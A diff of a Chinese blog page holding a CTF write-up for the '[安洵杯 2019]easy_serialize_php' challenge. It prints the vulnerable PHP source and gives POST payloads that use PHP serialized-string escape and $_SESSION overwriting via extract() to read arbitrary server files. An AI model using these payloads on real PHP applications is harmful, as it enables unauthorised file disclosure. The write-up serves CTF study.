@@ -27,20 +27,20 @@
 
   
   
-    <meta name="description" content="题目源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344 &lt;?php$function &#x3D; @$_GET[&#x27;f&#x27;];function filter($img)&#123;    $filter_arr &#x3D; array(&#x27;php&#x27;,&amp;#x2">
+    <meta name="description" content="题目源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344 &lt;?php$function &#x3D; @$_GET[&#x27;f&#x27;];function filter($img)&#123;    $filter_arr &#x3D; array(&#x27;php&#x27;,&amp;#x27">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[安洵杯 2019]easy_serialize_php">
 <meta property="og:url" content="http://example.com/2025/03/27/[%E5%AE%89%E6%B4%B5%E6%9D%AF%202019]easy_serialize_php/index.html">
 <meta property="og:site_name" content="KL">
-<meta property="og:description" content="题目源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344 &lt;?php$function &#x3D; @$_GET[&#x27;f&#x27;];function filter($img)&#123;    $filter_arr &#x3D; array(&#x27;php&#x27;,&amp;#x2">
+<meta property="og:description" content="题目源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344 &lt;?php$function &#x3D; @$_GET[&#x27;f&#x27;];function filter($img)&#123;    $filter_arr &#x3D; array(&#x27;php&#x27;,&amp;#x27">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/images/20250328085954031.png">
+<meta property="og:image" content="http://example.com/2025/03/27/images/20250328085954031.png">
 <meta property="article:published_time" content="2025-03-27T14:21:07.000Z">
-<meta property="article:modified_time" content="2025-03-29T11:16:56.047Z">
-<meta property="article:author" content="fuboy">
+<meta property="article:modified_time" content="2025-05-05T14:30:20.539Z">
+<meta property="article:author" content="FuB0Y">
 <meta property="article:tag" content="php反序列化字符串逃逸">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/images/20250328085954031.png">
+<meta name="twitter:image" content="http://example.com/2025/03/27/images/20250328085954031.png">
   
   
     <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
@@ -52,6 +52,14 @@
 <link rel="stylesheet" href="/css/style.css">
 
   <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
   
   
   
@@ -163,12 +171,8 @@
 </div>
 <header id="header">
   
-    <picture>
-      
-    </picture>
-    
-      <img fetchpriority="high" src="/images/banner.webp" alt="[安洵杯 2019]easy_serialize_php">
-    
+    <picture></picture>
+    <img fetchpriority="high" src="/../images/17373827994914.jpg" alt="[安洵杯 2019]easy_serialize_php">
   
   <div id="header-outer">
     <div id="header-title">
@@ -207,14 +211,14 @@
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
-  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="fuboy" class="lazyload">
-  <div class="sidebar-author-name">fuboy</div>
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
   <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
 </div>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">85</div>
+    <div class="sidebar-state-number">186</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -222,7 +226,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">62</div>
+    <div class="sidebar-state-number">179</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -287,7 +291,7 @@
       <div class="article-date">
   <a href="/2025/03/27/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Deasy_serialize_php/" class="article-date-link" data-aos="zoom-in">
     <time datetime="2025-03-27T14:21:07.000Z" itemprop="datePublished">2025-03-27</time>
-    <time style="display: none;" id="post-update-time">2025-03-29</time>
+    <time style="display: none;" id="post-update-time">2025-05-05</time>
   </a>
 </div>
 
@@ -304,15 +308,13 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
       
-        <p> 题目源码：</p>
+        <p>题目源码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">$function = @$_GET[&#x27;f&#x27;];</span><br><span class="line"></span><br><span class="line">function filter($img)&#123;</span><br><span class="line">    $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;);</span><br><span class="line">    $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;;</span><br><span class="line">    return preg_replace($filter,&#x27;&#x27;,$img);</span><br><span class="line">&#125;//将变量$img中的php flag php5 php4 fl1g的字符串替换成&#x27;&#x27;空字符</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_SESSION)&#123;//摧毁$_SESSION数组变量</span><br><span class="line">    unset($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;</span><br><span class="line">$_SESSION[&#x27;function&#x27;] = $function;//变量覆盖可以重置$_SESSION变量</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line">//extract() 函数从数组中将变量导入到当前的符号表</span><br><span class="line"></span><br><span class="line">if(!$function)&#123;</span><br><span class="line">    echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;</span><br><span class="line">&#125;//如果!$function为空的话输出刚开始的页面，也就是帮助页面</span><br><span class="line"></span><br><span class="line">if(!$_GET[&#x27;img_path&#x27;])&#123;//$_GET[&#x27;img_path&#x27;] 为空情况下会默认给定一个图片文件名 然后进行base64编码 赋值给SESSION</span><br><span class="line">    $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));</span><br><span class="line">&#125;//这里对接收到的img文件名进行base64编码和sha1加密</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line">//序列化$_SESSION然后进行了过滤</span><br><span class="line">if($function == &#x27;highlight_file&#x27;)&#123;</span><br><span class="line">    highlight_file(&#x27;index.php&#x27;);</span><br><span class="line">&#125;else if($function == &#x27;phpinfo&#x27;)&#123;</span><br><span class="line">    eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!</span><br><span class="line">&#125;else if($function == &#x27;show_image&#x27;)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));</span><br><span class="line">&#125; //highlight_file 显示源代码</span><br><span class="line">  # phpinfo 可以查看php信息</span><br><span class="line">  # show_imgage 对$serialize_info 进行反序列化</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>先代码审计一下</p>
 <p>这里有提示：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#125;else if($function == &#x27;phpinfo&#x27;)&#123;</span><br><span class="line">    eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!</span><br></pre></td></tr></table></figure>
-
-<p>那我们先传一个f&#x3D;phpinfo试一下看能不能找到什么东西</p>
-<p><img src="/../images/20250328085954031.png" alt="image-20250328085954031"></p>
+<p>那我们先传一个f=phpinfo试一下看能不能找到什么东西</p>
+<p><img src="../images/20250328085954031.png" alt="image-20250328085954031" /></p>
 <p>这个应该就是flag所在文件</p>
 <p>那现在就是读取flag了</p>
 <p>发现img被replace，又被序列化了</p>
@@ -322,23 +324,18 @@
 <p>它最后是反序列化session数组的所有值</p>
 <p>我们先序列化看一下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);</span><br><span class="line">$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;</span><br><span class="line">$_SESSION[&#x27;function&#x27;] = &#x27;a&#x27;;</span><br><span class="line">echo serialize($_SESSION);</span><br><span class="line"></span><br><span class="line">a:3:&#123;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:1:&quot;a&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
 <p><code>$serialize_info = filter(serialize($_SESSION));</code>它会把经过序列化的字符串进行过滤</p>
 <p>我们利用逃逸把img的值改变</p>
 <p>测试：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function filter($img)&#123;</span><br><span class="line">    $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;);</span><br><span class="line">    $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;;</span><br><span class="line">    return preg_replace($filter,&#x27;&#x27;,$img);</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[&quot;user&quot;] = &#x27;flagflagflagflagflagflag&#x27;;</span><br><span class="line">$_SESSION[&#x27;function&#x27;] = &#x27;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&#x27;; //改变img的值</span><br><span class="line">$_SESSION[&#x27;img&#x27;] = &quot;Z3Vlc3RfaW1nLnBuZw==&quot;;  //原值</span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line">echo $serialize_info;</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">再反序列化后：</span><br><span class="line">user=&quot;;s:8:&quot;function&quot;;s:59:&quot;a</span><br><span class="line">img=ZDBnM19mMWFnLnBocA==</span><br><span class="line">dd=a   //用来补充有三个元素的</span><br><span class="line">后面的&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;就被省略了</span><br></pre></td></tr></table></figure>
-
 <p>payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
 <p>然后查看源代码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$flag = &#x27;flag in /d0g3_fllllllag&#x27;;</span><br></pre></td></tr></table></figure>
-
-<p>又要去访问&#x2F;d0g3_fllllllag了</p>
-<p>只要把ZDBnM19mMWFnLnBocA&#x3D;&#x3D;改为L2QwZzNfZmxsbGxsbGFn就行了，它们的长度都是一样的</p>
+<p>又要去访问/d0g3_fllllllag了</p>
+<p>只要把ZDBnM19mMWFnLnBocA==改为L2QwZzNfZmxsbGxsbGFn就行了，它们的长度都是一样的</p>
 <p>payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
 <p>得到flag</p>
 
       
@@ -412,7 +409,7 @@
       <span class="icon-copyright"></span>
       2020-2025
       <span class="footer-info-sep rotate"></span>
-      fuboy
+      FuB0Y
     </div>
     
       <div>
@@ -423,10 +420,10 @@
     
       <div>
         <span class="icon-brush"></span>
-        115.8k
+        284k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        07:58
+        20:48
       </div>
     
     
@@ -464,14 +461,14 @@
 </div>
 </div>
       <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
-  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="fuboy" class="lazyload">
-  <div class="sidebar-author-name">fuboy</div>
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
   <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
 </div>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">85</div>
+    <div class="sidebar-state-number">186</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -479,7 +476,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">62</div>
+    <div class="sidebar-state-number">179</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -599,15 +596,15 @@
       
       <script data-pjax>
         window.REIMU_POST = {
-          author: "fuboy",
+          author: "FuB0Y",
           title: "[安洵杯 2019]easy_serialize_php",
           url: "http://example.com/2025/03/27/[%E5%AE%89%E6%B4%B5%E6%9D%AF%202019]easy_serialize_php/",
           excerpt: "",
           description: "",
-          stripContent: " 题目源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344 &amp;lt;?php$function = @$_GET[&amp;#x27;f&amp;#x27;];function filter($img)&amp;#123;    $filter_arr = array(&amp;#x27;php&amp;#x27;,&amp;#x27;flag&amp;#x27;,&amp;#x27;php5&amp;#x27;,&amp;#x27;php4&amp;#x27;,&amp;#x",
+          stripContent: "题目源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344 &amp;lt;?php$function = @$_GET[&amp;#x27;f&amp;#x27;];function filter($img)&amp;#123;    $filter_arr = array(&amp;#x27;php&amp;#x27;,&amp;#x27;flag&amp;#x27;,&amp;#x27;php5&amp;#x27;,&amp;#x27;php4&amp;#x27;,&amp;#x2",
           date: "Thu Mar 27 2025 22:21:07 GMT+0800",
-          updated: "Sat Mar 29 2025 19:16:56 GMT+0800",
-          cover: "/images/banner.webp",
+          updated: "Mon May 05 2025 22:30:20 GMT+0800",
+          cover: "/../images/17373827994914.jpg",
         };
       </script>
        
@@ -694,6 +691,15 @@
 </script>
 
 
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
 
 
 
